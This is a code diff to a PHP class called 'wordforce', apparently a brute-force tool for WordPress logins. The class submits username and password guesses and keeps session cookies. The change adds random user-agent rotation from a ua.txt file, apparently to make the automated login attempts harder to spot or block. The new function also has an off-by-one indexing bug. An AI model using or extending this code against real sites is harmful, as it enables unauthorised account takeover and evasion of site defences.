@@ -15,7 +15,6 @@
 //          |_|                           
 
 class wordforce {
-	
 	function save(string $url, string $username, string $password) {
 		$filename = "cookie.tmp";
 		// Open Connection
@@ -24,7 +23,7 @@ class wordforce {
 		// Setting up Connection
 		curl_setopt($ch, CURLOPT_URL, $url);
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
+		curl_setopt($ch, CURLOPT_USERAGENT, $this->random_ua());
 		// Setting up Cookie Jar
 		curl_setopt($ch, CURLOPT_COOKIEJAR, $filename);
 				
@@ -45,7 +44,7 @@ class wordforce {
 		curl_setopt($ch, CURLOPT_POST, 1);
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 		curl_setopt($ch, CURLOPT_POSTFIELDS, 'log=' . $username . '&pwd=' . $password);
-		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
+		curl_setopt($ch, CURLOPT_USERAGENT, $this->random_ua());
 		curl_setopt($ch, CURLOPT_COOKIEFILE, $filename);
 
 		// Make Request
@@ -60,5 +59,11 @@ class wordforce {
 		} else {
 			return false;
 		}
+	}
+
+	function random_ua(){
+		$ua = file_get_contents('ua.txt');
+		$rand_ua = explode("\n", $ua);	
+		return $rand_ua[rand(0, count($rand_ua))];
 	}
 }
